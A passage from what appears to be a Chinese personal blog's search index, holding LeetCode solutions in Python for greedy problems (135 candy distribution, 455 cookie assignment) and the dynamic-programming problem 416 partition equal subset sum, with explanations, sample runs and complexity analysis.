class="number">2</span>], [<span class="number">1</span>,<span class="number">3</span>] ]</span><br><span class="line">result=a.eraseOverlapIntervals(intervals)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【贪心算法】135.分发糖果</title>
      <link href="2021/01/02/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-135.%20%E5%88%86%E5%8F%91%E7%B3%96%E6%9E%9C/"/>
      <url>2021/01/02/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-135.%20%E5%88%86%E5%8F%91%E7%B3%96%E6%9E%9C/</url>
      
        <content type="html"><![CDATA[<p>贪心策略、分配问题</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。</p><p>你需要按照以下要求，帮助老师给这些孩子分发糖果：</p><ul><li>每个孩子至少分配到 1 个糖果。</li><li>评分更高的孩子必须比他两侧的邻位孩子获得更多的糖果。</li></ul><p>那么这样下来，老师至少需要准备多少颗糖果呢？</p><p>示例1:</p><pre><code>输入：[1,0,2]输出：5解释：你可以分别给这三个孩子分发 2、1、2 颗糖果。</code></pre><p>示例2：</p><pre><code>输入：[1,2,2]输出：4解释：你可以分别给这三个孩子分发 1、2、1 颗糖果。     第三个孩子只得到 1 颗糖果，这已满足上述两个条件。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：两次遍历"><a href="#方法一：两次遍历" class="headerlink" title="方法一：两次遍历"></a>方法一：两次遍历</h3><p>我们可以将「相邻的孩子中，评分高的孩子必须获得更多的糖果」这句话拆分为两个规则，分别处理</p><ul><li>左规则：当ratings[i-1]&lt;ratings[i]时，i号学生的糖果数量将比i-1号孩子的糖果数量多</li><li>右规则：当ratings[i]&gt;ratings[i+1]时，i号学生糖果数比i+1号孩子糖果数量多。</li></ul><p>初始化长度为len(ratings)1的列表</p><ul><li>先从左至右遍历，如果右边孩子的评分比左边的高，则右边孩子的糖果数更新为左边孩子的糖果数加 1；</li><li>再从右至左遍历，如果左边孩子的评分比右边的高，且左边孩子当前的糖果数不大于右边孩子的糖果数，则左边孩子的糖果数更新为右边孩子的糖果数加 1</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">candy</span><span class="params">(self, ratings)</span> -&gt; int:</span></span><br><span class="line">        n=len(ratings)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        tmp=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">if</span> ratings[i]&gt;ratings[i<span class="number">-1</span>]:</span><br><span class="line">                tmp[i]=tmp[i<span class="number">-1</span>]+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> ratings[j<span class="number">-1</span>]&gt;ratings[j] <span class="keyword">and</span> tmp[j<span class="number">-1</span>]&lt;=tmp[j]:</span><br><span class="line">                tmp[j<span class="number">-1</span>]=tmp[j]+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> tmp:</span><br><span class="line">            sum+=c</span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">ratings=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">a.candy(ratings)</span><br></pre></td></tr></table></figure><pre><code>5</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">candy</span><span class="params">(self, ratings)</span> -&gt; int:</span></span><br><span class="line">        n = len(ratings)</span><br><span class="line">        left = [<span class="number">0</span>] * n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> ratings[i] &gt; ratings[i - <span class="number">1</span>]:</span><br><span class="line">                left[i] = left[i - <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left[i] = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        right = ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; n - <span class="number">1</span> <span class="keyword">and</span> ratings[i] &gt; ratings[i + <span class="number">1</span>]:</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = <span class="number">1</span></span><br><span class="line">            ret += max(left[i], right)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">ratings=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">a.candy(ratings)</span><br></pre></td></tr></table></figure><pre><code>4</code></pre><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：时间复杂度：O(n)，其中 n是孩子的数量。我们需要遍历两次数组以分别计算满足左规则或右规则的最少糖果数量。</li><li>空间复杂度：O(n)，其中 n 是孩子的数量。我们需要保存所有的左规则对应的糖果数量</li></ul><h3 id="方法二：常数空间遍历"><a href="#方法二：常数空间遍历" class="headerlink" title="方法二：常数空间遍历"></a>方法二：常数空间遍历</h3><p>我们从左到右枚举每一个同学，记前一个同学分得的糖果数量为$pre$</p><ul><li><p>如果当前同学比上一个同学评分高，说明我们就在最近的递增序列中，直接分配给该同学 $pre+1$ 个糖果即可。</p></li><li><p>否则我们就在一个递减序列中，我们直接分配给当前同学一个糖果，并把该同学所在的递减序列中所有的同学都再多分配一个糖果，以保证糖果数量还是满足条件。</p><ul><li>我们无需显式地额外分配糖果，只需要记录当前的递减序列长度，即可知道需要额外分配的糖果数量。</li><li>同时注意当前的递减序列长度和上一个递增序列等长时，需要把最近的递增序列的最后一个同学也并进递减序列中</li></ul></li></ul><p>这样，我们只要记录当前递减序列的长度dec，最近的递增序列的长度 inc 和前一个同学分得的糖果数量pre 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">candy</span><span class="params">(self, ratings)</span> -&gt; int:</span></span><br><span class="line">        n = len(ratings)</span><br><span class="line">        ret = <span class="number">1</span></span><br><span class="line">        inc, dec, pre = <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> ratings[i] &gt;= ratings[i - <span class="number">1</span>]:</span><br><span class="line">                dec = <span class="number">0</span></span><br><span class="line">                pre = (<span class="number">1</span> <span class="keyword">if</span> ratings[i] == ratings[i - <span class="number">1</span>] <span class="keyword">else</span> pre + <span class="number">1</span>)</span><br><span class="line">                ret += pre</span><br><span class="line">                inc = pre</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dec += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> dec == inc:</span><br><span class="line">                    dec += <span class="number">1</span></span><br><span class="line">                ret += dec</span><br><span class="line">                pre = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">ratings=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">print(a.candy(ratings))</span><br></pre></td></tr></table></figure><pre><code>13</code></pre><p><strong>复杂度分析</strong></p><p>时间复杂度：O(n)，其中 n 是孩子的数量。我们需要遍历两次数组以分别计算满足左规则或右规则的最少糖果数量。</p><p>空间复杂度：O(1)。我们只需要常数的空间保存若干变量。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【贪心算法】455.分发饼干</title>
      <link href="2020/12/29/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-455.%20%E5%88%86%E5%8F%91%E9%A5%BC%E5%B9%B2/"/>
      <url>2020/12/29/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-455.%20%E5%88%86%E5%8F%91%E9%A5%BC%E5%B9%B2/</url>
      
        <content type="html"><![CDATA[<p>贪心策略、分配问题</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。</p><p>对每个孩子 <code>i</code>，都有一个胃口值 <code>g[i]</code>，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 <code>j</code>，都有一个尺寸 <code>s[j]</code> 。如果 <code>s[j] &gt;= g[i]</code>，我们可以将这个饼干 <code>j</code>分配给孩子 <code>i</code>，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。</p><p>示例1：</p><pre><code>输入: g = [1,2,3], s = [1,1]输出: 1解释: 你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。所以你应该输出1。</code></pre><p>示例2：</p><pre><code>输入: g = [1,2], s = [1,2,3]输出: 2解释: 你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。你拥有的饼干数量和尺寸都足以让所有孩子满足。所以你应该输出2.</code></pre><p>提示：</p><p>$1 &lt;= g.length &lt;= 3 * 10^4$</p><p>$0 &lt;= s.length &lt;= 3 * 10^4$</p><p>$1 &lt;= g[i], s[j] &lt;= 2^{31} - 1$</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>贪心策略是，给剩余孩子里最小饥饿度的孩子分配最小的能饱腹的饼干。<br>至于具体实现，因为我们需要获得大小关系，一个便捷的方法就是把孩子和饼干分别排序。<br>这样我们就可以从饥饿度最小的孩子和大小最小的饼干出发，计算有多少个对子可以满足条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findContentChildren</span><span class="params">(self, g, s)</span> -&gt; int:</span></span><br><span class="line">        new_g=sorted(g)</span><br><span class="line">        new_s=sorted(s)</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        j=<span class="number">0</span></span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> j&lt;len(new_s) <span class="keyword">and</span> i&lt;len(new_g):</span><br><span class="line">                <span class="keyword">if</span> new_s[j]&gt;=new_g[i]:</span><br><span class="line">                    sum+=<span class="number">1</span></span><br><span class="line">                    j = j+<span class="number">1</span></span><br><span class="line">                    i = i+<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j=j+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g=[<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>]</span><br><span class="line">s=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">a=Solution()</span><br><span class="line">a.findContentChildren(g,s)</span><br></pre></td></tr></table></figure><pre><code>2</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findContentChildren</span><span class="params">(self, g, s)</span> -&gt; int:</span></span><br><span class="line">        new_g=sorted(g)</span><br><span class="line">        new_s=sorted(s)</span><br><span class="line">        ng = len(new_g)</span><br><span class="line">        ns = len(new_s)</span><br><span class="line">        </span><br><span class="line">        i=j = <span class="number">0</span></span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> i&lt;ng <span class="keyword">and</span> j&lt;ns:</span><br><span class="line">            <span class="keyword">while</span> j&lt;ns <span class="keyword">and</span> new_g[i]&gt;new_s[j]:</span><br><span class="line">                j =j+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j &lt; ns:</span><br><span class="line">                sum += <span class="number">1</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g=[<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>]</span><br><span class="line">s=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">a=Solution()</span><br><span class="line">a.findContentChildren(g,s)</span><br></pre></td></tr></table></figure><pre><code>2</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【动态规划】416.分割等和子集</title>
      <link href="2020/12/25/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-416.%20%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/"/>
      <url>2020/12/25/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-416.%20%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>0-1背包问题思想、二维数组、滚动数组</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包含<strong>正整数的非空</strong>数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p><p>注意:</p><pre><code>每个数组中的元素不会超过 100数组的大小不会超过 200</code></pre><p>示例1：</p><pre><code>输入: [1, 5, 11, 5]输出: true解释: 数组可以分割成 [1, 5, 5] 和 [11].</code></pre><p>示例2：</p><pre><code>输入: [1, 2, 3, 5]输出: false解释: 数组不能分割成两个元素和相等的子集.</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="转换为0-1背包问题"><a href="#转换为0-1背包问题" class="headerlink" title="转换为0-1背包问题"></a>转换为0-1背包问题</h3><p><strong>「0 - 1」 背包问题的思路</strong></p><p>0-1背包问题特点：每个数只能用一次。解决思路：<strong>物品一个一个选 ，容量一点一点增加考虑</strong>，这也是【动态规划】的思想，特别重要</p><p>实际上，尝试把候选物品放入背包，通过比较得出一个物品要不要拿走。</p><p>具体做法：<br>具体做法是：画一个 <code>n</code> 行，<code>target + 1</code> 列的表格。这里 <code>n</code> 是物品的个数，<code>target</code> 是背包的容量。<code>n</code> 行表示一个一个物品考虑，<code>target + 1</code>多出来的那 1 列，表示背包容量从 0 开始考虑。很多时候，我们需要考虑这个容量为 0 的数值。</p><p><strong>状态与状态转移方程</strong></p><ul><li><p>状态定义：<code>dp[i][j]</code>表示从数组的<code>[0, i]</code>这个子区间内挑选一些正整数，每个数只能用一次，使得这些数的和恰好等于 j。</p></li><li><p>状态转移方程：很多时候，状态转移方程思考的角度是「分类讨论」，对于「0-1 背包问题」而言就是「当前考虑到的数字选与不选」。</p><ul><li>不选择 <code>nums[i]</code>，如果在<code>[0, i - 1]</code>这个子区间内已经有一部分元素，使得它们的和为<code>j</code>，那么 <code>dp[i][j] = true</code></li><li>选择<code>nums[i]</code>，如果在 <code>[0, i - 1]</code>这个子区间内就得找到一部分元素，使得它们的和为 <code>j - nums[i]</code></li></ul></li></ul><p><strong>状态转移方程：</strong></p><p><code>dp[i][j] = dp[i - 1][j] or dp[i - 1][j - nums[i]]</code></p><p>一般写出状态转移方程以后，就需要考虑初始化条件。</p><ul><li><code>j - nums[i]</code>作为数组的下标，一定得保证大于等于 0 ，因此 <code>nums[i] &lt;= j</code></li><li>注意到一种非常特殊的情况：<code>j 恰好等于 nums[i]</code>，即单独 <code>nums[j]</code> 这个数恰好等于此时「背包的容积」<code>j</code>，这也是符合题意的。</li></ul><p><strong>因此完整的状态转移方程是：</strong></p><p>$$ dp[i][j]= \begin{cases} dp[i-1][j],\quad 至少是这个答案，如果dp[i-1][j]为真，直接计算下一个状态<br>\ true, \quad nums[i]=j<br>\dp[i-1][j-nums[i]] \quad nums[i]&lt;j\end{cases} \tag{1} $$</p><p>说明：虽然写成花括号，但是它们的关系是 <strong>或者</strong></p><ul><li>初始化：<code>dp[0][0] = false</code>，因为候选数 <code>nums[0]</code>是正整数，凑不出和为 0；</li><li>输出：<code>dp[n - 1][target]</code>，这里<code>n</code> 表示数组的长度，<code>target</code>是数组的元素之和（必须是偶数）的一半。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canPartition</span><span class="params">(self, nums)</span> -&gt; bool:</span></span><br><span class="line">        <span class="comment"># 空的or长度为1,直接返回false</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)&lt;=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 若集合中元素和为奇数，直接返回false</span></span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            sum+=i</span><br><span class="line">        <span class="keyword">if</span> sum%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理集合元素和为偶数情况</span></span><br><span class="line">        n= len(nums)</span><br><span class="line">        target = sum//<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建二维状态数组，行：物品索引，列：容量（包括 0）</span></span><br><span class="line">        dp = [[<span class="literal">False</span>] * (target + <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#先填表格第 0 行，第 1 个数只能让容积为它自己的背包恰好装满</span></span><br><span class="line">        <span class="keyword">if</span> nums[<span class="number">0</span>] &lt;=target:</span><br><span class="line">            dp[<span class="number">0</span>][nums[<span class="number">0</span>]] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(target+<span class="number">1</span>):</span><br><span class="line">                <span class="comment">#dp[i][j] = dp[i - 1][j]# 直接从上一行先把结果抄下来，然后再修正</span></span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">if</span> nums[i]==j:</span><br><span class="line">                    dp[i][j]=<span class="literal">True</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> nums[i]&lt;j:</span><br><span class="line">                    dp[i][j]= dp[i<span class="number">-1</span>][j] <span class="keyword">or</span> dp[i<span class="number">-1</span>][j-nums[i]]</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][target]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">result=a.canPartition(nums)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>Falsetarget=43 行 5列     0 1 2 3 41  0 F T F F F2  1 F T T T F5  2 F T T T F</code></pre><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(NC)：这里 N 是数组元素的个数，C 是数组元素的和的一半。</li><li>空间复杂度：O(NC)。</li></ul><h3 id="空间优化，一维数组"><a href="#空间优化，一维数组" class="headerlink" title="空间优化，一维数组"></a>空间优化，一维数组</h3><p>「0-1 背包问题」常规优化：「状态数组」从二维降到一维，减少空间复杂度。</p><ul><li>在「填表格」的时候，当前行只参考了上一行的值，因此状态数组可以只设置 2 行，使用「滚动数组」的技巧「填表格」即可；</li><li>实际上，在「滚动数组」的基础上还可以优化，在「填表格」的时候，当前行总是参考了它上面一行 「头顶上」 那个位置和「左上角」某个位置的值。因此，我们可以只开一个一维数组，从后向前依次填表即可。</li><li>「从后向前」 写的过程中，一旦 <code>nums[i] &lt;= j</code>不满足，可以马上退出当前循环，因为后面的 j 的值肯定越来越小，没有必要继续做判断，直接进入外层循环的下一层。相当于也是一个剪枝，这一点是「从前向后」填表所不具备的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canPartition</span><span class="params">(self, nums)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)&lt;=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        sum= <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            sum+=i</span><br><span class="line">        <span class="keyword">if</span> sum%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        n= len(nums)</span><br><span class="line">        target= sum//<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        dp=[<span class="literal">False</span>]*(target+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> nums[<span class="number">0</span>]&lt;=target:</span><br><span class="line">            dp[nums[<span class="number">0</span>]]=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(target,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">if</span> dp[target]:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> nums[i]&gt;j:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                dp[j]= dp[j] <span class="keyword">or</span> dp[j-nums[i]]</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> dp[target]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">result=a.canPartition(nums)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>True</code></pre><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(NC)：这里 N 是数组元素的个数，C 是数组元素的和的一半；</li><li>空间复杂度：O(C)：减少了物品那个维度，无论来多少个数，用一行表示状态就够了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【动态规划】322.零钱兑换</title>
